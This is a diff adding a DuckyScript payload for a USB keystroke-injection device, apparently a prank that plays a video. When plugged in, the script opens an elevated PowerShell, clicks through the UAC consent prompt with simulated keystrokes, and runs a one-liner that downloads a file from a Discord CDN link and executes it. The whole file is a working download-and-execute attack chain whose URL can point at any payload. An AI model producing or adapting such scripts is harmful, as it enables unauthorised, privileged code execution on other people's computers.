@@ -1,0 +1,14 @@
+REM start of script
+REM
+REM let the HID enumerate
+DELAY 2000
+GUI r
+DELAY 200
+REM my best attempt at a elevated powershell instance
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 3000
+ALT y
+DELAY 3000
+STRING $down = New-Object System.Net.Webclient; $url = 'https://cdn.discordapp.com/attachments/1154635152610299964/1155258532598382744/rick.mp4'; $file = 'rick.mp4'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
+ENTER	
